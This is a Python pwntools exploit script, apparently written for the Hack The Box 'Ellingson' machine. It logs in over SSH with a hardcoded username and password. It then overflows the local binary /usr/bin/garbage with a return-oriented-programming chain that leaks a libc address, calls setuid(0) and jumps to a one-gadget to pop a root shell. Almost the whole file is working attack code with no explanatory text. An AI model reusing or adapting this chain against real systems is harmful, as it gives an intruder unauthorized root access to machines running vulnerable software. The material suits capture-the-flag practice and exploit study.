from pwn import *
import sys

#p = process("/root/Desktop/htb/boxes/ellingson/garbage")
remoteshell = ssh('margo','10.10.10.139',22,'iamgod$08')
p = remoteshell.process("/usr/bin/garbage")

#0x000000000040179b : pop rdi ; ret
pop_rdi = p64(0x40179b)
got_plt = p64(0x404028)
put_plt = p64(0x401050)
main = p64(0x401619)

#Stage 1: Leak
payload  = "A"*136 + pop_rdi + got_plt + put_plt + main
p.sendline(payload)
temp = p.recvuntil('\x7f')
temp = temp.split('\n')[2]
leakedputs = u64(temp+'\x00\x00')
print '[+] leakedputs : {}'.format(leakedputs)

#Stage 2: finding offsets
#libc = 0x71910
libc = 0x809c0
libc_addr = leakedputs - libc
print '[+] libc@glibc : {}'.format(libc_addr)
#system = p64(0x449c0 + libc_addr)
system = p64(libc_addr + 0x4f440)
#sh = p64(0x181519 + libc_addr)
sh = p64(libc_addr + 0x1b3e9a)
#stage 3: setuid
#setuid=p64(libc_addr + 0xc7500)
setuid = p64(libc_addr + 0xe5970)
auth = p64(0x401513)
payload = "A"*136 + pop_rdi + p64(0x0)+ setuid + auth
p.sendline(payload)

#Stage 4: popping shell
#payload = "A"*136 + pop_rdi + sh + system
payload = "A"*136 + p64(0x4f2c5+libc_addr)
p.sendline(payload)
p.interactive()
